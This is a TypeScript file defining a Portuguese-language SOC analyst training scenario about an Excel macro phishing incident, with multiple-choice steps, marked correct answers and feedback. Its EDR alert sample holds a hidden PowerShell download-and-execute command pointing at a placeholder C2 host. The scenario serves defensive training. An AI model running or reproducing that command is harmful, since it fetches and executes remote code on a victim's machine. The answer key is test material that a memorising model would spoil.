import type { Scenario } from '../../types/scenario';

export const socIncidentPhishingScenario: Scenario = {
  id: 'soc-incident-phishing-triage',
  domain: 'cybersecurity',
  format: 'guided',
  title: 'Trote de Segurança SOC N1: Alerta de Phishing e Execução de Macro Maliciosa',
  hook: 'Um utilizador executou um ficheiro Excel anexo a um email suspeito. O EDR detetou um processo `powershell.exe` gerado a partir do Excel descarregando um payload externo.',
  difficulty: 'senior',
  timeEstimateMin: 15,
  tags: ['cybersecurity', 'soc', 'edr', 'incident-response', 'phishing'],

  contextArtifacts: [
    {
      id: 'edr-alert',
      label: 'Alerta EDR (CrowdStrike / Defender)',
      language: 'json',
      content: `{
  "timestamp": "2026-10-23T14:22:10Z",
  "host": "WS-FIN-042",
  "user": "maria.silva",
  "process": "powershell.exe",
  "parentProcess": "excel.exe",
  "commandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -W Hidden -IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.internal/payload.ps1')"
}`,
    }
  ],

  progressiveArtifacts: [],

  steps: [
    {
      id: 'step-1',
      prompt: 'Qual é a primeira ação imediata que o Analista SOC N1 deve tomar para conter o incidente?',
      options: [
        { id: 'a', label: 'Isolar a máquina afetada (Host Isolation) via EDR', correct: true, feedback: 'Correto! O isolamento de rede impede que o endpoint se comunique com o C2 ou lateralize na rede corporativa.' },
        { id: 'b', label: 'Enviar email a avisar a utilizadora para fechar o Excel', correct: false, feedback: 'Incorreto. Demasiado lento e ineficaz se o malware já estiver em execução.' },
        { id: 'c', label: 'Reiniciar o servidor de DNS corporativo', correct: false, feedback: 'Incorreto. Irrelevante para um incidente endpoint.' },
      ]
    },
    {
      id: 'step-2',
      prompt: 'Analisando a linha de comandos, qual técnica do MITRE ATT&CK está a ser utilizada?',
      options: [
        { id: 'a', label: 'T1059.001 - Command and Scripting Interpreter: PowerShell', correct: true, feedback: 'Perfeito! Uso de PowerShell com flags de ocultação e download remoto de scripts.' },
        { id: 'b', label: 'T1543 - Create or Modify System Process', correct: false, feedback: 'Incorreto. Não se trata de criação de serviço de sistema.' },
        { id: 'c', label: 'T1078 - Valid Accounts', correct: false, feedback: 'Incorreto. Não envolve roubo de credenciais legítimas.' },
      ]
    },
    {
      id: 'step-3',
      prompt: 'Após o isolamento e recolha de artefactos, qual o próximo passo no fluxo de resposta a incidentes?',
      options: [
        { id: 'a', label: 'Investigar o email de origem no gateway de email, revogar sessões ativas do utilizador e abrir ticket de post-mortem', correct: true, feedback: 'Correto! Identificar o vetor inicial (email de phishing), revogar tokens/credenciais comprometidas e documentar as lições aprendidas.' },
        { id: 'b', label: 'Formatar o disco do servidor principal de produção', correct: false, feedback: 'Incorreto. O incidente ocorreu num workstation de finanças, não no servidor de produção.' },
        { id: 'c', label: 'Ignorar o alerta se o antivírus limpou o ficheiro', correct: false, feedback: 'Incorreto. Se houve execução de PowerShell via macro, o risco de comprometimento persiste.' },
      ]
    }
  ],

  resolution: {
    rootCause: 'Utilizador abriu anexo malicioso em Excel contendo macro VBA que invocou o PowerShell para descarregar payload de C2 externo.',
    fix: 'Isolamento imediato do host WS-FIN-042 via EDR, terminação de processos suspeitos, revogação de tokens de acesso da utilizadora e bloqueio do domínio C2 no firewall/proxy.',
    preventions: [
      'Desativar macros do Office por padrão em toda a organização via política de Group Policy (GPO).',
      'Reforçar formação de consciencialização de phishing para colaboradores.'
    ]
  }
};
